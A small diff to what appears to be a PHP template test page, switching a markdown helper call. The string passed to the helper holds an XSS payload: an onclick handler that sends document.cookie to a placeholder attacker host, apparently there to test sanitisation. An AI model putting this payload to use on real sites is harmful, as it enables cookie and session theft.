@@ -5,7 +5,7 @@
     <p>Current time: {{ date('F j, Y, g:i A') }}  </p>
 
 <h2>Testing Markdown</h2>
-{{ Library\Html\Helpers::toHtml('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.
+{{ HTML::markdown('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.
 
 It was released in 2009, and helps improve web typography.
 
